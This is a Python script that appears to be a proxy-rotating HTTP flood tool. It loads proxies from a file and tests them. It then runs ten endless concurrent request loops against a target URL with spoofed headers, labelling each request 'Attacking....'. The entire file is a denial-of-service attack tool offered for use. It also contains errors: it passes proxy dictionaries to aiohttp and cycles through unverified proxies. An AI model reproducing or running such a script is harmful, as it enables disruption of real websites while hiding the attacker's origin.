import asyncio
import re
import aiohttp
from fake_headers import Headers
from itertools import cycle

try:
    list_proxy = []  # Declare a global variable

    async def check_proxy(proxy):
        try:
            async with aiohttp.ClientSession() as session:
                proxies = {"http": proxy, "https": proxy}
                async with session.get("https://praveenms.site", proxy=proxies, timeout=10) as response:
                    if response.status == 200:
                        print(f"Proxy {proxy} is working and appended to the list!")
                        list_proxy.append(proxy)
                    else:
                        print(f"Proxy {proxy} is not working!")
        except Exception as e:
            print(f"Proxy {proxy} is not working!")

    def read_proxy():
        list_proxy = []
        with open('proxies.txt', 'r') as f:
            content = f.read()
        ip_addresses = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", content)
        port_numbers = re.findall(r":\d{1,5}", content)
        for i in range(len(ip_addresses)):
            list_proxy.append("http://" + ip_addresses[i] + port_numbers[i])
        return list_proxy

    async def make_request(i, site, proxy_cycle):
        try:
            async with aiohttp.ClientSession() as session:
                while True:
                    proxy = next(proxy_cycle)
                    proxies = {
                        "http": proxy,
                        "https": proxy
                    }
                    message = f"Thread Id: {i}"
                    print(message)
                    headers = Headers(headers=True).generate()
                    async with session.get(site, headers=headers, proxy=proxies, timeout=10) as response:
                        print(f"Thread Id: {i} : {response.status} Attacking....")
        except aiohttp.ClientError as e:
            print(f"[-] Error: Failed to make the HTTP request in Thread Id: {i}")
            print(e)


    async def main():
        print("Checking proxies...")
        ProxyList = read_proxy()
        workingProxies = []

        proxy_cycle = cycle(ProxyList)
        proxy_check_tasks = [check_proxy(proxy) for proxy in ProxyList]
        await asyncio.gather(*proxy_check_tasks)

        print("Checking proxies completed!")
        print(f"Working proxies: {list_proxy}")

        site = "https://example.com"  # Replace with your target site
        request_tasks = [make_request(i, site, proxy_cycle) for i in range(10)]  # Number of concurrent requests
        await asyncio.gather(*request_tasks)

    asyncio.run(main())
    
except KeyboardInterrupt:
    print("[-] KeyboardInterrupt detected! Exiting...")
    exit(0)
except Exception as e:
    print(f"[-] Error: {e}")
    exit(1)